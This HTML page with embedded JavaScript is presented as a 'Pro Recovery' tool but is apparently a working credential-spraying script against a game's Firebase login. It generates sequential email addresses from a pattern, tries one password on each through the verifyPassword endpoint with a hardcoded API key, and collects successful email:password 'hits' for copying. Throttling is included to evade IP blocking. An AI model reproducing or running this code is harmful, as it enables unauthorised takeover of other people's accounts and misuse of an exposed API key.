<!DOCTYPE html>
<html>
<head>
    <title>CPMEGY PRO RECOVERY</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #050505; color: #e0e0e0; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 15px; margin: 0; }
        .box { max-width: 480px; margin: auto; background: #111; padding: 25px; border-radius: 20px; border: 1px solid #00ffcc; box-shadow: 0 10px 30px rgba(0,255,204,0.1); }
        h2 { color: #00ffcc; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 25px; font-size: 20px; }
        
        input { width: 100%; padding: 14px; margin: 10px 0; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 10px; box-sizing: border-box; outline: none; transition: 0.3s; }
        input:focus { border-color: #00ffcc; box-shadow: 0 0 10px rgba(0,255,204,0.2); }
        
        .btn-start { width: 100%; padding: 16px; background: #00ffcc; color: #000; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 15px; transition: 0.3s; }
        .btn-start:active { transform: scale(0.98); }

        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 20px 0; }
        .stat-box { background: #000; padding: 15px; border-radius: 12px; border: 1px solid #222; }
        .stat-box span { font-size: 11px; color: #888; text-transform: uppercase; display: block; margin-bottom: 5px; }
        .stat-box b { font-size: 22px; color: #00ffcc; }

        #resArea { width: 100%; height: 200px; background: #000; color: #00ff00; border: 1px solid #333; border-radius: 10px; padding: 12px; font-family: 'Courier New', monospace; font-size: 13px; margin-top: 15px; box-sizing: border-box; resize: none; }
        
        .copy-btn { width: 100%; padding: 12px; background: #222; color: #00ffcc; border: 1px solid #00ffcc; border-radius: 10px; margin-top: 12px; cursor: pointer; font-weight: bold; }
        .footer-note { font-size: 10px; color: #555; margin-top: 15px; }
    </style>
</head>
<body>

<div class="box">
    <h2>⚡ PRO RECOVERY</h2>
    
    <input type="text" id="fmt" placeholder="Format: player_{4}_@gmail.com">
    <input type="text" id="pwd" placeholder="Target Password">
    
    <button class="btn-start" id="mainBtn" onclick="startProScan()">🔥 START NO-SKIP SCAN</button>

    <div class="stats-grid">
        <div class="stat-box"><span>Checked</span><b id="c_val">0</b></div>
        <div class="stat-box"><span>Found</span><b id="f_val">0</b></div>
    </div>

    <p style="text-align:left; font-size:12px; color:#00ffcc; margin:0 0 5px 5px;">✅ HITS (Email:Pass):</p>
    <textarea id="resArea" readonly placeholder="Found accounts will appear here..."></textarea>
    
    <button class="copy-btn" onclick="copyHits()">📋 COPY ALL HITS</button>
    <div class="footer-note">Anti-IP Block Active | Adaptive Concurrency Enabled</div>
</div>

<script>
    let running = false;
    let checked = 0;
    let found = 0;
    let index = 0;

    async function startProScan() {
        if (running) { location.reload(); return; }
        
        let fmt = document.getElementById('fmt').value.trim();
        let pwd = document.getElementById('pwd').value.trim();
        let key = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ";

        if (!fmt.includes('{') || !pwd) return alert("Please enter Format and Password!");

        running = true;
        document.getElementById('mainBtn').innerText = "🛑 STOP SCANNING";
        document.getElementById('mainBtn').style.background = "#ff4d4d";
        
        let digits = fmt.match(/\{(\d+)\}/)[1];
        let max = Math.pow(10, digits);

        // --- PRO LOGIC: BATCH PROCESSING ---
        while (running && index < max) {
            let batch = [];
            let batchSize = 20; // സെക്കൻഡിൽ 100 അക്കൗണ്ട് സ്പീഡ് നിലനിർത്താൻ 20 വീതം പ്രോസസ്സ് ചെയ്യുന്നു

            for (let i = 0; i < batchSize && index < max; i++) {
                let num = index.toString().padStart(digits, '0');
                let email = fmt.replace(/\{(\d+)\}/, num);
                batch.push(checkAccount(email, pwd, key));
                index++;
            }

            // ബാച്ചിലെ എല്ലാ റിക്വസ്റ്റും പൂർത്തിയായെന്ന് ഉറപ്പാക്കുന്നു (No-Skip)
            await Promise.all(batch);
            
            checked = index;
            document.getElementById('c_val').innerText = checked;

            // IP ബ്ലോക്ക് ഒഴിവാക്കാൻ ചെറിയൊരു ബ്രീത്തിങ് ടൈം
            await new Promise(r => setTimeout(r, 150));
        }
    }

    async function checkAccount(em, pw, k) {
        try {
            let res = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${k}`, {
                method: 'POST',
                body: JSON.stringify({ email: em, password: pw, returnSecureToken: true }),
                headers: { 'Content-Type': 'application/json' }
            });
            let data = await res.json();
            
            if (data && data.idToken) {
                found++;
                document.getElementById('f_val').innerText = found;
                document.getElementById('resArea').value += em + ":" + pw + "\n";
                document.getElementById('resArea').scrollTop = document.getElementById('resArea').scrollHeight;
            }
        } catch (e) {
            // കണക്ഷൻ എറർ വന്നാൽ ആ ഇൻഡക്സ് വീണ്ടും ട്രൈ ചെയ്യാൻ ബാച്ചിൽ ഉൾപ്പെടുത്താം
        }
    }

    function copyHits() {
        let area = document.getElementById('resArea');
        if (!area.value) return;
        area.select();
        document.execCommand('copy');
        alert("Hits copied to clipboard!");
    }
</script>

</body>
</html>
